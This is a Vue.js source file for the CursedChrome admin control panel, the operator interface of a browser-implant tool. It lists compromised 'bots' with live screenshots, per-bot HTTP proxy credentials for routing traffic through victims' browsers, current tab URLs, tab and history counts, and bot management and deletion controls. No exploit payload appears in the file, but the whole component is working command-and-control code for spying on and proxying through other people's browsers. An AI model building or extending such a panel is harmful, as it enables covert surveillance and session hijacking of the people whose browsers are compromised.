<template>
  <div>
    <!-- Loading bar -->
    <div class="fixed-bottom" v-if="loading">
      <b-progress
        :value="100"
        variant="success"
        striped
        :animated="true"
      ></b-progress>
    </div>
    <!-- Navbar, only displayed when logged in -->
    <div v-if="user.is_authenticated">
      <b-navbar
        toggleable="lg"
        type="dark"
        variant="primary"
        fixed="top"
        sticky
      >
        <b-navbar-brand href="#"
          >CursedChrome Admin Control Panel</b-navbar-brand
        >
        <b-navbar-toggle target="nav-collapse"></b-navbar-toggle>
        <b-collapse id="nav-collapse" is-nav>
          <b-navbar-nav>
            <b-nav-item
              target="_blank"
              href="https://github.com/s045pd/CursedChrome"
            >
              <font-awesome-icon
                :icon="['fab', 'github']"
                class="icon alt mr-1 ml-1"
              ></font-awesome-icon>
              Repo
            </b-nav-item>
          </b-navbar-nav>
          <b-navbar-nav class="ml-auto">
            <b-nav-item>
              <font-awesome-icon
                :icon="['fas', 'sync-alt']"
                class="icon alt mr-1 ml-1"
              ></font-awesome-icon>
              RefreshTime:
              <select v-model="refreshTime" @change="changeRefreshTime">
                <option
                  v-bind:key="time"
                  v-for="time in refreshTimes"
                  :value="time"
                >
                  {{ time }}
                </option>
              </select>
              Seconds
            </b-nav-item>

            <b-nav-item>
              <font-awesome-icon
                :icon="['fas', 'user']"
                class="icon alt mr-1 ml-1"
              ></font-awesome-icon>
              Logged in as: <b>{{ user.username }}</b>
            </b-nav-item>
            <b-nav-item v-on:click="logout">
              Sign Out
              <font-awesome-icon
                :icon="['fas', 'sign-out-alt']"
                class="icon alt mr-1 ml-1"
              ></font-awesome-icon>
            </b-nav-item>
          </b-navbar-nav>
        </b-collapse>
      </b-navbar>
      <b-alert
        variant="warning"
        class="text-center"
        show
        v-if="user.password_should_be_changed"
      >
        <p>
          <font-awesome-icon
            :icon="['fas', 'exclamation-triangle']"
            class="icon alt mr-1 ml-1"
          ></font-awesome-icon>
          You are currently using a system-generated password, please update
          your account password.
        </p>
        <b-button variant="primary" v-on:click="show_update_password_modal">
          <font-awesome-icon
            :icon="['fas', 'edit']"
            class="icon alt mr-1 ml-1"
          ></font-awesome-icon>
          Update Password
        </b-button>
      </b-alert>
    </div>
    <div id="main">
      <!-- Login Page -->
      <div v-if="!user.is_authenticated">
        <div class="form-signin" style="max-width: 300px; margin: 0 auto">
          <div class="text-center mb-4">
            <h1 class="h3 mb-3 font-weight-normal">
              CursedChrome
              <br />
              Admin Panel
            </h1>
            <b-alert show>
              <font-awesome-icon
                :icon="['fas', 'info-circle']"
                class="icon alt mr-1 ml-1"
              ></font-awesome-icon>
              <i
                >If this is your first time logging in, please use the
                credentials printed to your console when you first set the
                service up.</i
              >
            </b-alert>
          </div>
          <div class="input-group mb-2" style="width: 100%">
            <div class="input-group-prepend">
              <span class="input-group-text" style="min-width: 100px"
                >Username</span
              >
            </div>
            <input
              type="text"
              class="form-control"
              placeholder="admin"
              v-model="user.login.username"
              autofocus
            />
          </div>
          <div class="input-group mb-3" style="width: 100%">
            <div class="input-group-prepend">
              <span class="input-group-text" style="min-width: 100px"
                >Password</span
              >
            </div>
            <input
              type="password"
              class="form-control"
              placeholder="********"
              v-model="user.login.password"
            />
          </div>
          <button class="btn btn-lg btn-primary btn-block" v-on:click="log_in">
            <font-awesome-icon
              :icon="['fas', 'sign-in-alt']"
              class="icon alt mr-1 ml-1"
            ></font-awesome-icon>
            Sign in
          </button>
        </div>
      </div>
      <!-- Admin panel controls -->
      <div v-if="user.is_authenticated">
        <!-- Bots panel -->
        <b-card-group deck>
          <b-card
            border-variant="primary"
            header="CursedChrome Bots"
            header-bg-variant="primary"
            header-text-variant="white"
            align="center"
          >
            <b-card-text>
              <!-- Filter and Batch Operations -->
              <b-row class="mb-3">
                <b-col cols="12">
                  <b-card bg-variant="light">
                    <b-row>
                      <b-col md="3">
                        <b-form-group label="Filter by Name" label-for="filter-name">
                          <b-form-input
                            id="filter-name"
                            v-model="filters.name"
                            placeholder="Enter bot name"
                            @input="applyFilters"
                          ></b-form-input>
                        </b-form-group>
                      </b-col>
                      <b-col md="2">
                        <b-form-group label="Online Status" label-for="filter-online">
                          <b-form-select
                            id="filter-online"
                            v-model="filters.is_online"
                            :options="onlineStatusOptions"
                            @change="applyFilters"
                          ></b-form-select>
                        </b-form-group>
                      </b-col>
                      <b-col md="2">
                        <b-form-group label="Lock Status" label-for="filter-state">
                          <b-form-select
                            id="filter-state"
                            v-model="filters.state"
                            :options="stateOptions"
                            @change="applyFilters"
                          ></b-form-select>
                        </b-form-group>
                      </b-col>
                      <b-col md="2">
                        <b-form-group label="Per Page" label-for="page-size">
                          <b-form-select
                            id="page-size"
                            v-model="pagination.limit"
                            :options="pageSizeOptions"
                            @change="changePageSize"
                          ></b-form-select>
                        </b-form-group>
                      </b-col>
                      <b-col md="3" class="d-flex align-items-end">
                        <b-button-group class="w-100">
                          <b-button variant="secondary" @click="clearFilters">
                            <font-awesome-icon :icon="['fas', 'redo']" class="mr-1" />
                            Clear Filters
                          </b-button>
                          <b-button 
                            variant="danger" 
                            @click="batchDeleteBots"
                            :disabled="selectedBots.length === 0"
                          >
                            <font-awesome-icon :icon="['fas', 'trash']" class="mr-1" />
                            Batch Delete ({{ selectedBots.length }})
                          </b-button>
                        </b-button-group>
                      </b-col>
                    </b-row>
                  </b-card>
                </b-col>
              </b-row>

              <h1>Connected Browser Bot(s)</h1>
              <div v-if="pagination.total > 0" class="text-muted mb-2">
                Total {{ pagination.total }} bots, showing {{ (pagination.page - 1) * pagination.limit + 1 }} - {{ Math.min(pagination.page * pagination.limit, pagination.total) }}
              </div>
              <table class="table table-striped">
                <thead>
                  <tr>
                    <th scope="col" style="width: 50px;">
                      <b-form-checkbox
                        v-model="selectAll"
                        @change="toggleSelectAll"
                      ></b-form-checkbox>
                    </th>
                    <th scope="col">Capture</th>
                    <th scope="col">Name</th>
                    <th scope="col">HTTP Proxy Credentials</th>
                    <th scope="col">Online?</th>
                    <th scope="col">Tabs/History</th>
                    <th scope="col">CurrentTab</th>
                    <th scope="col">Options</th>
                  </tr>
                </thead>
                <tbody>
                  <tr
                    v-for="bot in bots_list"
                    v-bind:key="bot.id"
                  >
                    <td style="vertical-align: middle;">
                      <b-form-checkbox
                        v-model="selectedBots"
                        :value="bot.id"
                      ></b-form-checkbox>
                    </td>
                    <td scope="row" style="vertical-align: middle">
                      <b-img
                        :src="`/api/v1/bots/image/${bot.id}`"
                        alt="Image"
                        width="160"
                        height="90"
                        fluid
                      ></b-img>
                    </td>
                    <td scope="row" style="vertical-align: middle">
                      {{ bot.name }}
                      <b-icon
                        v-if="bot.state == 'locked'"
                        icon="lock-fill"
                        class="rounded bg-primary p-1"
                        variant="light"
                      ></b-icon>
                      <b-icon
                        v-else
                        icon="unlock-fill"
                        class="rounded bg-danger p-1"
                        variant="light"
                      ></b-icon>
                    </td>
                    <td style="vertical-align: middle">
                      <div>
                        <div class="input-group" style="width: 100%">
                          <div class="input-group-prepend">
                            <span
                              class="input-group-text"
                              style="min-width: 100px"
                              >Username</span
                            >
                          </div>
                          <input
                            type="text"
                            class="form-control"
                            placeholder="Please wait..."
                            v-bind:value="bot.proxy_username"
                          />
                          <!-- <div class="input-group-append">
                            <span
                              class="input-group-text copy-element"
                              v-bind:data-clipboard-text="bot.proxy_username"
                              v-on:click="copy_toast"
                            >
                              <font-awesome-icon
                                :icon="['fas', 'clipboard']"
                                class="icon alt mr-1 ml-1"
                            /></span>
                          </div> -->
                        </div>
                        <div class="input-group" style="width: 100%">
                          <div class="input-group-prepend">
                            <span
                              class="input-group-text"
                              style="min-width: 100px"
                              >Password</span
                            >
                          </div>
                          <input
                            type="text"
                            class="form-control"
                            placeholder="Please wait..."
                            v-bind:value="bot.proxy_password"
                          />
                          <!-- <div
                            class="input-group-append copy-element"
                            v-bind:data-clipboard-text="bot.proxy_password"
                            v-on:click="copy_toast"
                          >
                            <span class="input-group-text">
                              <font-awesome-icon
                                :icon="['fas', 'clipboard']"
                                class="icon alt mr-1 ml-1"
                            /></span>
                          </div> -->
                        </div>
                      </div>
                    </td>
                    <td
                      class="table-success online-col"
                      style="vertical-align: middle"
                      v-if="bot.is_online"
                    >
                      <span class="online-symbol">
                        <font-awesome-icon
                          :icon="['fas', 'check-circle']"
                          class="icon alt mr-1 ml-1"
                        />
                      </span>
                    </td>
                    <td
                      class="online-col table-danger p-0"
                      style="vertical-align: middle"
                      v-if="!bot.is_online"
                    >
                      <div>
                        <span class="offline-symbol">
                          <font-awesome-icon
                            :icon="['fas', 'times-circle']"
                            class="icon alt mr-1 ml-1"
                          />
                        </span>
                      </div>
                      <b-badge
                        :title="convertToCurrentTimeZone(bot.last_online)"
                        >{{
                          timeAgo(convertToCurrentTimeZone(bot.last_online))
                        }}</b-badge
                      >
                    </td>
                    <td>{{ bot.tabs }} / {{ bot.history }}</td>
                    <td >
                      <b-link :href="bot.current_tab.url" target="”_blank”"
                        >{{ bot.current_tab.title }}
                      </b-link>
                    </td>

                    <td style="vertical-align: middle">
                      <b-button-group vertical>
                        <b-button
                          variant="primary"
                          v-on:click="bot_open_options(bot.id)"
                        >
                          <font-awesome-icon
                            :icon="['fas', 'cog']"
                            class="icon alt mr-1 ml-1"
                          />
                          Options
                        </b-button>
                        <b-button
                          variant="danger"
                          v-on:click="delete_bot(bot.id)"
                        >
                          <font-awesome-icon
                            :icon="['fas', 'trash']"
                            class="icon alt mr-1 ml-1"
                          />
                          Delete
                        </b-button>
                      </b-button-group>
                    </td>
                  </tr>
                </tbody>
              </table>
              
              <!-- Pagination -->
              <b-row v-if="pagination.totalPages > 1" class="mt-3">
                <b-col cols="12" class="d-flex justify-content-center">
                  <b-pagination
                    v-model="pagination.page"
                    :total-rows="pagination.total"
                    :per-page="pagination.limit"
                    @change="changePage"
                    align="center"
                    size="md"
                    class="mb-0"
                  ></b-pagination>
                </b-col>
              </b-row>
            </b-card-text>
          </b-card>
        </b-card-group>
        <!-- Options panel -->
        <DownloadCA />
        <!-- Bot options modal -->
        <BasicBoard :info="selected_bot" :refresh="refresh_bots" />
        <!-- Update user password modal -->
        <div>
          <b-modal
            id="update_password_modal"
            title="Update Account Password"
            ok-only
            ok-variant="secondary"
            ok-title="Never mind"
          >
            <p>Enter your new password below</p>
            <div class="input-group mb-2">
              <div class="input-group-prepend">
                <span class="input-group-text">New Password</span>
              </div>
              <input
                type="password"
                class="form-control"
                placeholder="******"
                v-model="update_password.new_password"
                autofocus
              />
            </div>
            <div class="input-group mb-2">
              <div class="input-group-prepend">
                <span class="input-group-text">New Password (Again)</span>
              </div>
              <input
                type="password"
                class="form-control"
                placeholder="******"
                v-model="update_password.new_password_again"
                autofocus
              />
            </div>
            <b-alert
              class="text-center"
              show
              variant="danger"
              v-if="!change_passwords_match"
            >
              <font-awesome-icon
                :icon="['fas', 'exclamation-circle']"
                class="icon alt mr-1 ml-1"
              />
              Both passwords do not match, double check your inputs.
            </b-alert>
            <b-button
              variant="primary btn-block"
              v-bind:disabled="!change_passwords_match"
              v-on:click="update_user_password"
            >
              <font-awesome-icon
                :icon="['fas', 'key']"
                class="icon alt mr-1 ml-1"
              />
              Change Password
            </b-button>
          </b-modal>
        </div>
      </div>
    </div>
  </div>
</template>
<script>
import { api_request } from "@/components/utils.js";
import DownloadCA from "@/components/DownloadCA.vue";
import BasicBoard from "@/components/Basic.vue";
import { convertToCurrentTimeZone } from "@/components/common.js";

export default {
  name: "Main",
  components: {
    BasicBoard,
    DownloadCA,
  },
  data() {
    window.app = this;
    return {
      update_password: {
        new_password: "",
        new_password_again: "",
      },
      user: {
        is_authenticated: false,
        username: null,
        password_should_be_changed: null,
        login: {
          username: "",
          password: "",
        },
      },
      loading: false,

      // bot data refresh
      refreshTimes: [1, 2, 3, 4, 5, 10, 15, 20, 25, 30],
      refreshTime: 5,
      refreshInterval: null,

      // bot data
      bots_map: {},
      bots_list: [],
      bot_length_map: {},
      selected_bot: {},
      id_bot_selected: null,

      // Pagination
      pagination: {
        page: 1,
        limit: 10,
        total: 0,
        totalPages: 0,
      },

      // Filters
      filters: {
        name: "",
        is_online: "",
        state: "",
      },

      // Batch operations
      selectedBots: [],
      selectAll: false,

      // Options for filters
      onlineStatusOptions: [
        { value: "", text: "All" },
        { value: "true", text: "Online" },
        { value: "false", text: "Offline" },
      ],
      stateOptions: [
        { value: "", text: "All" },
        { value: "locked", text: "Locked" },
        { value: "unlocked", text: "Unlocked" },
      ],
      pageSizeOptions: [5, 10, 20, 50, 100],

      // Debounce timer for filter
      filterDebounceTimer: null,
    };
  },
  computed: {
    change_passwords_match() {
      return (
        this.update_password.new_password ===
        this.update_password.new_password_again
      );
    },
  },
  watch: {
    selectedBots(newVal) {
      // Update selectAll checkbox based on selection
      if (newVal.length === 0) {
        this.selectAll = false;
      } else if (newVal.length === this.bots_list.length && this.bots_list.length > 0) {
        this.selectAll = true;
      } else {
        this.selectAll = false;
      }
    },
  },
  methods: {
    async update_user_password() {
      await api_request(
        "PUT",
        "/password",
        {},
        {
          new_password: this.update_password.new_password,
        }
      );
      this.user.password_should_be_changed = false;
      this.$nextTick(() => {
        this.$bvModal.hide("update_password_modal");
      });
    },
    show_update_password_modal() {
      this.$nextTick(() => {
        this.$bvModal.show("update_password_modal");
      });
    },
    async update_auth_status() {
      try {
        var auth_result = await api_request("GET", "/me");
      } catch (e) {
        return;
      }

      this.user.is_authenticated = true;
      this.user.username = auth_result.username;
      this.user.password_should_be_changed =
        auth_result.password_should_be_changed;
    },
    async log_in() {
      try {
        var login_result = await api_request(
          "POST",
          "/login",
          {},
          {
            username: this.user.login.username,
            password: this.user.login.password,
          }
        );
      } catch (e) {
        console.error(`Invalid login.`);
        console.error(e);
        this.$toastr.e(e.error);
        return;
      }
      // Clear password field
      this.user.login.password = "";

      this.user.is_authenticated = true;
      this.user.username = login_result.username;
      this.user.password_should_be_changed =
        login_result.password_should_be_changed;
    },
    async logout() {
      await api_request("GET", "/logout");
      this.user.is_authenticated = false;
      this.user.password_should_be_changed = null;
    },

    // time
    setRefreshTime() {
      this.refreshInterval = setInterval(() => {
        if (this.user.is_authenticated) {
          this.refresh_bots();
        }
      }, this.refreshTime * 1000);
    },
    changeRefreshTime() {
      clearInterval(this.refreshInterval);
      this.setRefreshTime();
    },
    convertToCurrentTimeZone(date) {
      return convertToCurrentTimeZone(date);
    },
    // 检查当前时间距离现在过去的时间
    timeAgo(date) {
      const now = new Date();
      const diff = now - new Date(date);
      const seconds = Math.floor(diff / 1000);
      const minutes = Math.floor(seconds / 60);
      const hours = Math.floor(minutes / 60);
      const days = Math.floor(hours / 24);
      if (days > 0) {
        return `${days} days ago`;
      } else if (hours > 0) {
        return `${hours} hours ago`;
      } else if (minutes > 0) {
        return `${minutes} minutes ago`;
      } else {
        return `${seconds} seconds ago`;
      }
    },

    async delete_bot(bot_id) {
      this.$bvModal
        .msgBoxConfirm("Are you sure delete this bot?", {
          title: "Please Confirm",
          size: "sm",
          buttonSize: "sm",
          okVariant: "danger",
          okTitle: "YES",
          cancelTitle: "NO",
          footerClass: "p-2",
          hideHeaderClose: false,
          centered: true,
        })
        .then(() => {
          api_request(
            "DELETE",
            "/bots",
            {},
            {
              bot_id: bot_id,
            }
          ).then(() => {
            this.$toastr.s("Bot deleted successfully.");
            setTimeout(() => {
              this.refresh_bots();
            }, 3 * 1000);
          });
        })
        .catch(() => {});
    },
    bot_open_options(bot_id) {
      this.id_bot_selected = bot_id;
      this.selected_bot = copy(this.bots_map[bot_id]);
      this.$nextTick(() => {
        this.$bvModal.show("bot_options_modal");
      });
    },
    reset_options_modal() {
      this.selected_bot = {};
      this.id_bot_selected = null;
    },
    async refresh_bots() {
      const params = {
        page: this.pagination.page,
        limit: this.pagination.limit,
      };

      // Add filters if they exist
      if (this.filters.name) {
        params.name = this.filters.name;
      }
      if (this.filters.is_online !== "") {
        params.is_online = this.filters.is_online;
      }
      if (this.filters.state) {
        params.state = this.filters.state;
      }

      const response = await api_request("GET", "/bots", params);
      
      // Update bots_map for compatibility with existing code
      this.bots_map = {};
      response.bots.map((bot) => {
        this.bots_map[bot.id] = bot;
      });
      
      // Update bots_list for table display
      this.bots_list = response.bots;
      
      // Update pagination info
      if (response.pagination) {
        this.pagination.total = response.pagination.total;
        this.pagination.totalPages = response.pagination.totalPages;
      }

      // Update selected_bot if there's a bot currently selected
      if (this.id_bot_selected) {
        this.selected_bot = copy(this.bots_map?.[this.id_bot_selected] || {});
      }

      // Clear selections if current page changes
      this.selectedBots = [];
      this.selectAll = false;
    },

    // Filter methods
    applyFilters() {
      // Debounce filter application
      if (this.filterDebounceTimer) {
        clearTimeout(this.filterDebounceTimer);
      }
      this.filterDebounceTimer = setTimeout(() => {
        this.pagination.page = 1; // Reset to first page when filtering
        this.refresh_bots();
      }, 500);
    },

    clearFilters() {
      this.filters.name = "";
      this.filters.is_online = "";
      this.filters.state = "";
      this.pagination.page = 1;
      this.refresh_bots();
    },

    // Pagination methods
    changePage(page) {
      this.pagination.page = page;
      this.refresh_bots();
    },

    changePageSize() {
      this.pagination.page = 1; // Reset to first page when changing page size
      this.refresh_bots();
    },

    // Batch selection methods
    toggleSelectAll() {
      if (this.selectAll) {
        this.selectedBots = this.bots_list.map(bot => bot.id);
      } else {
        this.selectedBots = [];
      }
    },

    // Batch delete
    async batchDeleteBots() {
      if (this.selectedBots.length === 0) {
        this.$toastr.w("Please select bots to delete first");
        return;
      }

      this.$bvModal
        .msgBoxConfirm(
          `Are you sure you want to delete ${this.selectedBots.length} selected bot(s)? This action cannot be undone!`,
          {
            title: "Batch Delete Confirmation",
            size: "md",
            buttonSize: "sm",
            okVariant: "danger",
            okTitle: "Delete",
            cancelTitle: "Cancel",
            footerClass: "p-2",
            hideHeaderClose: false,
            centered: true,
          }
        )
        .then(async () => {
          try {
            await api_request(
              "POST",
              "/bots/batch-delete",
              {},
              {
                bot_ids: this.selectedBots,
              }
            );
            this.$toastr.s(`Successfully deleted ${this.selectedBots.length} bot(s)`);
            this.selectedBots = [];
            this.selectAll = false;
            setTimeout(() => {
              this.refresh_bots();
            }, 1000);
          } catch (e) {
            this.$toastr.e("Batch delete failed: " + e.message);
          }
        })
        .catch(() => {});
    },

    copy_toast() {
      // this.$toastr.s("Copied to clipboard successfully.");
    },
  },
  mounted: async function () {
    // new ClipboardJS(".copy-element"); // eslint-disable-line
    await this.update_auth_status();
    if (this.user.is_authenticated) {
      this.refresh_bots();
    }
    this.setRefreshTime();
  },
};

function copy(input_data) {
  return JSON.parse(JSON.stringify(input_data));
}
</script>
<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
.online-col {
  width: 20px;
  text-align: center;
}
.offline-symbol {
  font-size: 30px;
  color: #fc0303;
}

.online-symbol {
  font-size: 30px;
  color: #00c914;
}

#main {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  padding-top: 10vh;
  max-width: 90%;
  width: 95%;
  margin: 0 auto;
  top: 50%;
}

.navbar-dark .navbar-nav .nav-link {
  color: rgba(255, 255, 255, 1);
}
</style>
